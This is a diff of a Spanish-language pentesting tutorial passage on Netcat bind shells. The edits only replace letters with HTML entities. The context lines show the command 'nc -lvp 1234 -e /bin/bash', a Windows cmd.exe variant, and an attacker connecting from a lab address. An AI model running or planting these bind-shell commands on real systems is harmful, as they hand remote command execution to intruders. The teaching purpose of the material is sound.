@@ -48,7 +48,7 @@ or easily driven..........>
 
 Un atacante podría usar el comando **`nc -lvp 1234 -e /bin/bash`** en el sistema comprometido (192.168.78.6) para crear un escucha en el puerto **`1234`** y ejecutar ( **-e** ) el shell Bash ( **/bin/bash** ).
 
-#### C_reación de un shell de enlace utilizando Netcat._
+#### &#x43;_&#x72;eación de un shell de enlace utilizando Netcat._
 
 ```
 ~$ nc -lvp 1234 -e /bin/bash
@@ -57,7 +57,7 @@ listening on [any] 1234 ...
 
 > Windows **nc -lvp 1234 -e cmd.exe** Netcat.
 
-En el sistema atacante (192.168.78.147), se utiliza el comando nc -nv 192.168.78.6 1234 para conectarse con la víctima**.** Una vez que el atacante (192.168.78.147) se conecta con la víctima (192.168.78.6), se invoca el comando **ls** y se muestran tres archivos en la pantalla del atacante.
+En el sistema atacante (192.168.78.147), se utiliza el comando nc -nv 192.168.78.6 1234 para conectarse con la víctim&#x61;**.** Una vez que el atacante (192.168.78.147) se conecta con la víctima (192.168.78.6), se invoca el comando **ls** y se muestran tres archivos en la pantalla del atacante.
 
 #### _Conexión al Bind Shell mediante Netcat_
 
